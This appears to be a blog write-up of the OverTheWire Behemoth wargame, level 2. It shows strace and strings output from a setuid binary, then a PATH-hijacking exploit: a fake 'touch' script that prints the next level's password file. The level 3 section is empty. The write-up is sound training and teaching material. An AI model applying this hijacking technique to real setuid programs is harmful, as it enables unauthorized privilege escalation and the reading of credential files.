---
layout: post
title: behemoth-writeup-02-03
excerpt: "Writeup for the Behemoth (L02 & L03) wargame on overthewire.org."
categories: [writeup]
tags: [itsec, wargame]
---

[overthewire / behemoth](http://www.overthewire.org/wargames/behemoth/)

## Level 2 ##

This one started off as a bit of a fun one:

``` shell
behemoth2@behemoth:/behemoth$ ./behemoth2
touch: cannot touch '180': Permission denied
^C
behemoth2@behemoth:/behemoth$ ./behemoth2
touch: cannot touch '186': Permission denied
^C
```

A run through `strace` yields more information:

``` shell
behemoth2@behemoth:/behemoth$ strace ./behemoth2
execve("./behemoth2", ["./behemoth2"], [/* 21 vars */]) = 0
[ Process PID=204 runs in 32 bit mode. ]
...
getpid()                                = 204
lstat64("204", 0xffffd5c0)              = -1 ENOENT (No such file or directory)
unlink("204")                           = -1 ENOENT (No such file or directory)
rt_sigaction(SIGINT, {SIG_IGN, [], 0}, {SIG_DFL, [], 0}, 8) = 0
rt_sigaction(SIGQUIT, {SIG_IGN, [], 0}, {SIG_DFL, [], 0}, 8) = 0
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xffffd500) = 205
waitpid(205, touch: cannot touch '204': Permission denied
[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0) = 205
rt_sigaction(SIGINT, {SIG_DFL, [], 0}, NULL, 8) = 0
rt_sigaction(SIGQUIT, {SIG_DFL, [], 0}, NULL, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=205, si_status=1, si_utime=0, si_stime=0} ---
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
rt_sigaction(SIGCHLD, NULL, {SIG_DFL, [], 0}, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
nanosleep({2000, 0}, ^CProcess 204 detached
 <detached ...>
```

We now see where that number comes from - it's the process' PID - and the pause is due to the call to `sleep`. Mmm.

Looking at the binary through `strings`, we see something of interest:

``` shell
behemoth2@behemoth:/behemoth$ strings behemoth2 | egrep -v -e'^(\.|_)'
/lib/ld-linux.so.2
libc.so.6
sprintf
unlink
getpid
system
sleep
GLIBC_2.4
GLIBC_2.0
PTRh
QVhm
cat
D$(
[^_]
touch %d
;*2$"
GCC: (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4
crtstuff.c
deregister_tm_clones
register_tm_clones
completed.6591
frame_dummy
behemoth2.c
data_start
sleep@@GLIBC_2.0
unlink@@GLIBC_2.0
lstat
getpid@@GLIBC_2.0
system@@GLIBC_2.0
main
sprintf@@GLIBC_2.0
```

And that's the way `touch` is invoked. It's a little sneaky but you'll notice it's not using an absolute path. If this was `/usr/bin/touch` instead there isn't much we could have done. But what will happen is that the program will look for the first available `touch` in `$PATH`.

With this in mind we can create a 'fake' touch that might just output the password file.

``` shell
behemoth2@behemoth:/behemoth$ cd /tmp
behemoth2@behemoth:/tmp$ cat > touch
#!/bin/sh
/bin/cat /etc/behemoth_pass/behemoth3
behemoth2@behemoth:/tmp$ chmod +x /tmp/touch
behemoth2@behemoth:/tmp$ PATH=/tmp:$PATH /behemoth/behemoth2
*** password ***
^C
```

Nice!

PS: I should note I tried a whole bunch of other stuff before deciding to start on a clean slate - it looks straightforward when put that way but it was anything but!

## Level 3 ##

``` shell

```

